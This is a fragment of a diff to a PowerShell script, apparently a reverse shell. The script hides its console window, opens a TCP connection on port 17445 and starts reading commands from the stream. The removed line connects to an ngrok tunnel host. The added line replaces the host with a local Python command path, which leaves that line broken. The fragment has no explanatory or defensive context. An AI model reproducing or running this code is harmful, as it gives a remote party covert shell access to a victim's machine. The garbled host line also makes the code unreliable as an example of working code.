@@ -1,7 +1,7 @@
 $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
 add-type -name win -member $t -namespace native
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("0.tcp.sa.ngrok.io", 17445));
+Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("& C:/Users/driiv/AppData/Local/Programs/Python/Python313/python.exe c:/Users/driiv/Documents/digis/automacao_v5.py", 17445));
 Set-Variable -Name stream -Value ($client.GetStream());
 [byte[]]$bytes = 0..65535|%{0};
 while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){
